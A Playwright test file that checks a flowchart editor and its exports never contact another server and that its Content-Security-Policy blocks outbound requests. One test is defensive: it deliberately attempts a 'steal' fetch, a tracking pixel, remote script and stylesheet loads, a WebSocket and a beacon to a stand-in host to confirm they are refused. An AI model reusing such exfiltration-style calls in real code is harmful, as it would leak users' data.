// "No network" guarantees: nothing in the editor or its exports contacts another server.
import { test, expect } from '@playwright/test';
import { execSync } from 'node:child_process';
import { readFileSync } from 'node:fs';

const LOCAL = /^(data|blob|about|file):/;

// Drive every feature, recording any request that isn't to the page's own origin.
async function exerciseEverything(page, origin, outDir) {
  const external = [];
  page.context().on('request', (r) => { const u = r.url(); if (!LOCAL.test(u) && !u.startsWith(origin)) external.push(u); });
  const errors = [];
  page.on('pageerror', (e) => errors.push(e.message));
  await page.waitForFunction(() => window.fc && window.fc.getDoc());
  const click = (sel) => page.click(sel);
  for (const t of ['basic', 'swim', 'swimh', 'walkthrough']) {
    await click('[data-cmd="new"]'); await click(`[data-template="${t}"]`);
  }
  // every font choice
  for (const f of ['system', 'inter', 'serif', 'hand', 'plex']) {
    await page.evaluate((f) => { const d = window.fc.getDoc(); d.settings.font = f; window.fc.setDoc(d); }, f);
    await page.evaluate(() => document.fonts.ready);
  }
  await click('[data-cmd="mode-preview"]'); await page.waitForTimeout(200);
  await page.frameLocator('#preview').locator('[data-node="OTC-10"]').click();
  await click('[data-cmd="mode-edit"]');
  await click('[data-cmd="export-menu"]'); await click('[data-cmd="import-sheet"]');
  await click('#sheet-example'); await click('#sheet-create');
  await click('[data-cmd="export-menu"]'); await click('[data-cmd="import-text"]'); await click('#outline-create');
  const files = [];
  for (const c of ['export-html', 'export-html-small', 'export-svg', 'export-png', 'export-json']) {
    await click('[data-cmd="export-menu"]');
    const [dl] = await Promise.all([page.waitForEvent('download'), click(`[data-cmd="${c}"]`)]);
    const path = `${outDir}/${c}-${dl.suggestedFilename()}`;
    await dl.saveAs(path);
    files.push(path);
  }
  // open the exported pages / images too
  for (const f of files.filter((x) => /\.(html|svg)$/.test(x))) {
    const p = await page.context().newPage();
    await p.goto('file://' + f);
    await p.waitForTimeout(200);
    await p.close();
  }
  await click('[data-cmd="theme"]');
  await page.keyboard.press('?'); await page.keyboard.press('Escape');
  return { external, errors, files };
}

test('development version: no feature contacts another server', async ({ page }, info) => {
  await page.goto('/?template=basic');
  const { external, errors } = await exerciseEverything(page, 'http://localhost:', info.outputDir);
  expect(external).toEqual([]);
  expect(errors).toEqual([]);
});

test('single-file build: no feature makes any network request at all', async ({ browser }, info) => {
  execSync('node scripts/build.js', { stdio: 'ignore' });
  const ctx = await browser.newContext({ acceptDownloads: true });
  const page = await ctx.newPage();
  await page.goto('file://' + process.cwd() + '/dist/flowchart-editor.html?template=basic');
  const { external, errors, files } = await exerciseEverything(page, 'file:', info.outputDir);
  expect(external).toEqual([]);
  expect(errors).toEqual([]);
  // exported files contain no external addresses (XML namespace identifiers aside)
  for (const f of files.filter((x) => !x.endsWith('.png'))) {
    const text = readFileSync(f, 'utf8');
    expect(text.match(/https?:\/\/(?!www\.w3\.org\/)[^\s"'<)]+/g), f).toBeNull();
  }
  await ctx.close();
});

test('the policy actively blocks a request even if code tried to make one', async ({ browser }) => {
  execSync('node scripts/build.js', { stdio: 'ignore' });
  const html = readFileSync('dist/flowchart-editor.html', 'utf8');
  const csp = html.match(/http-equiv="Content-Security-Policy" content="([^"]+)"/)[1];
  expect(csp).toContain("default-src 'none'");
  expect(csp).toContain("connect-src 'none'");
  expect(csp).not.toContain("'self'");
  const ctx = await browser.newContext();
  const page = await ctx.newPage();
  // anything that actually reaches the network layer passes through this route
  const reachedNetwork = [], refused = [];
  await ctx.route((u) => !LOCAL.test(u.href), (r) => { reachedNetwork.push(r.request().url()); r.abort(); });
  ctx.on('requestfailed', (r) => { if (!LOCAL.test(r.url())) refused.push(r.failure()?.errorText); });
  await page.goto('file://' + process.cwd() + '/dist/flowchart-editor.html');
  await page.waitForFunction(() => window.fc);
  const result = await page.evaluate(async () => {
    const violations = [];
    document.addEventListener('securitypolicyviolation', (e) => violations.push(e.violatedDirective));
    let fetchBlocked = false;
    try { await fetch('https://example.com/steal?x=1'); } catch (_) { fetchBlocked = true; }
    const img = new Image(); img.src = 'https://example.com/pixel.gif';
    const s = document.createElement('link'); s.rel = 'stylesheet'; s.href = 'https://example.com/x.css'; document.head.append(s);
    const sc = document.createElement('script'); sc.src = 'https://example.com/x.js'; document.head.append(sc);
    let wsBlocked = false;
    try { new WebSocket('wss://example.com/'); } catch (_) { wsBlocked = true; }
    navigator.sendBeacon?.('https://example.com/beacon', 'x');
    await new Promise((r) => setTimeout(r, 300));
    return { fetchBlocked, wsBlocked, violations: [...new Set(violations)] };
  });
  expect(result.fetchBlocked).toBe(true);
  expect(result.violations).toEqual(expect.arrayContaining(['connect-src', 'img-src', 'style-src-elem', 'script-src-elem']));
  expect(reachedNetwork).toEqual([]); // nothing left the browser
  expect(new Set(refused)).toEqual(new Set(['csp'])); // each attempt was refused by the policy
  await ctx.close();
});

test('exported pages carry the no-network policy and links can be switched off', async ({ page }) => {
  await page.goto('/?template=blank');
  await page.waitForFunction(() => window.fc);
  const html = await page.evaluate(() => {
    window.fc.setDoc({ nodes: [{ id: 'a', shape: 'process', x: 0, y: 0, w: 160, h: 60, text: 'A', fields: { what: 'See https://intranet.example/workpaper-12' } }] });
    return window.fc.exportHTML();
  });
  expect(html).toContain(`http-equiv="Content-Security-Policy" content="default-src 'none'`);
  // links on (default): clickable, and they don't reveal where they were clicked from
  await page.setContent(html);
  await page.locator('[data-node="a"]').click();
  await expect(page.locator('#detail a')).toHaveAttribute('rel', 'noopener noreferrer');
  // links off
  await page.goto('/?template=blank');
  await page.waitForFunction(() => window.fc);
  const plain = await page.evaluate(() => {
    window.fc.setDoc({ settings: { linkify: false }, nodes: [{ id: 'a', shape: 'process', x: 0, y: 0, w: 160, h: 60, text: 'A', fields: { what: 'See https://intranet.example/workpaper-12' } }] });
    return window.fc.exportHTML();
  });
  await page.setContent(plain);
  await page.locator('[data-node="a"]').click();
  await expect(page.locator('#detail')).toContainText('https://intranet.example/workpaper-12');
  await expect(page.locator('#detail a')).toHaveCount(0);
});
